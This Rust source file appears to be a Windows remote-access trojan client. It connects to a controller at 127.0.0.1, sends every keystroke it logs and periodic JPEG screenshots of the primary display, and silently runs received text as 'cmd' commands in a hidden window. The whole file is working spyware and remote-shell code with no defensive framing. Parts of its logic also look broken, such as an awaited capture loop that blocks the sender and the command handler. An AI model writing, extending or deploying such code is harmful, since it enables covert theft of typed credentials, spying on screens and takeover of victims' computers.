use image::codecs::jpeg::JpegEncoder;
use tokio::io::{self, AsyncReadExt, AsyncWriteExt};
use tokio::sync::mpsc;
use tokio::net::TcpStream;
use tokio::time::Duration;

use scrap::{Capturer, Display};
use image::ExtendedColorType;
use rdev::{Event, listen};

use std::io::ErrorKind::WouldBlock;
use std::io::Cursor;
use std::thread;
use std::process::Command;
use std::os::windows::process::CommandExt;

#[tokio::main]
async fn main() -> io::Result<()> {
    let socket_text = TcpStream::connect("127.0.0.1:7878").await?;
    let socket_img = TcpStream::connect("127.0.0.1:7879").await?;
    let (mut rd, mut wr) = io::split(socket_text);
    let (_rd_img, mut wr_img) = io::split(socket_img); 

    let (tx, mut rx) = mpsc::channel(16);
    let (tx_bytes, mut rx_bytes) = mpsc::channel(16);

    let tx_clone = tx.clone();
    tokio::task::spawn_blocking( move || {
        let callback = move |event: Event| {
            match event.name {
                Some(string) => {
                    tx_clone.blocking_send(string).expect("cannot send string");
                },
                None => (),
            }
        };

        if let Err(error) = listen(callback) {
            println!("{:?}", error);
        }
    });

    tokio::spawn(async move  {
        while let Some(data) = rx.recv().await {
            wr.write_all(data.as_bytes()).await?;
        }

        Ok::<_, io::Error>(())
    });

    let frame_duration = Duration::from_secs_f32(3.0);

    tokio::task::spawn_blocking(move || {
        let display = Display::primary().map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;
        let mut capturer = Capturer::new(display).map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;
        let (w, h) = (capturer.width(), capturer.height());

        loop {
            let buffer = match capturer.frame() {
                Ok(buffer) => buffer,
                Err(error) => {
                    if error.kind() == WouldBlock {
                        thread::sleep(frame_duration);
                        continue;
                    } else {
                        panic!("error: {}", error);
                    }
                }
            };

            let mut bitflipped = Vec::with_capacity(w * h * 4);
            let stride = buffer.len() / h;

            for y in 0..h {
                for x in 0..w {
                    let i = stride * y + 4 * x;
                    bitflipped.extend_from_slice(&[
                        buffer[i + 2],
                        buffer[i + 1],
                        buffer[i],
                        255,
                    ]);
                }
            }
        
            let mut compressed_bytes = Vec::new();
            let mut encoder = JpegEncoder::new(&mut compressed_bytes);
            encoder.encode(
                &bitflipped, 
                w as u32, 
                h as u32, 
                ExtendedColorType::Rgb8
            ).unwrap();

            if tx_bytes.blocking_send(compressed_bytes).is_err() {
                break;
            }

            std::thread::sleep(frame_duration);
        }

        Ok::<_, io::Error>(())
    })
    .await?
    .expect("cannot spawn blocking");

    tokio::spawn(async move  {
        while let Some(data) = rx_bytes.recv().await {
            wr_img.write_all(data.as_slice()).await?;
        }

        Ok::<_, io::Error>(())
    });

    let mut buf = vec![0; 256];

    loop {
        let n = rd.read(&mut buf).await?;

        if n == 0 {
            break;
        }

        let command = std::str::from_utf8(&buf[..n]);
        
        match command {
            Ok(command) => {
                Command::new("cmd")
                    .args(["/C", command])
                    .creation_flags(0x08000000) 
                    .output()
                    .expect("failed to excute command");
            }
            Err(_) => println!("cannot decode bytes to str")
        }
    }

    Ok(())
}
